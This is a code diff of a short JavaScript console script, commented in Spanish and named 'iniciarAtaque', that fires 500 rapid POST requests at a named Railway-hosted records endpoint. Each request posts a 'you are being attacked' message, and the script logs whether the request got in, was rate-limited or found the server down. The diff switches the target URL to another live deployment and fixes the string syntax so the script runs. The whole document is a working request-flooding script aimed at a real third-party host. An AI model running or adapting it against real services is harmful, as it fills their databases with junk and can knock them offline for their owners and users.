@@ -1,8 +1,8 @@
-const URL_OBJETIVO = 'https://crud-mex-llovera-production.up.railway.app/registros';
+const URL_OBJETIVO = 'https://cruninsano-production.up.railway.app/registros';
 
 async function iniciarAtaque() {
     console.clear();
-    console.log(%c🚀 INICIANDO PRUEBA DE CARGA CONTRA: ${URL_OBJETIVO}, "color: yellow; font-size: 14px; font-weight: bold;");
+    console.log(`%c🚀 INICIANDO PRUEBA DE CARGA CONTRA: ${URL_OBJETIVO}`, "color: yellow; font-size: 14px; font-weight: bold;");
 
     // Lanzamos 20 peticiones rápidas
     for (let i = 1; i <= 500; i++) {
@@ -13,16 +13,16 @@ async function iniciarAtaque() {
             },
             // 👇 AQUÍ ESTÁ EL CAMBIO IMPORTANTE: Usamos "registro"
             body: JSON.stringify({ 
-                contenido: ESTAS SIENDO ATACADO CON PETICION #${i} 
+                registro: `ESTAS SIENDO ATACADO CON PETICION #${i}` 
             }) 
         })
         .then(res => {
             if (res.ok) {
-                console.log(%c✅ Impacto #${i}: ÉXITO (Código ${res.status}) - ¡Entró!, "color: green; font-weight: bold");
+                console.log(`%c✅ Impacto #${i}: ÉXITO (Código ${res.status}) - ¡Entró!`, "color: green; font-weight: bold");
             } else if (res.status === 429) {
-                console.log(%c🛡️ Impacto #${i}: REBOTADO (Su Rate Limit funciona), "color: orange; font-weight: bold");
+                console.log(`%c🛡️ Impacto #${i}: REBOTADO (Su Rate Limit funciona)`, "color: orange; font-weight: bold");
             } else {
-                console.error(❌ Impacto #${i}: FALLÓ (Código ${res.status}));
+                console.error(`❌ Impacto #${i}: FALLÓ (Código ${res.status})`);
             }
         })
         .catch(err => console.error("💀 El servidor no responde (posible caída):", err));
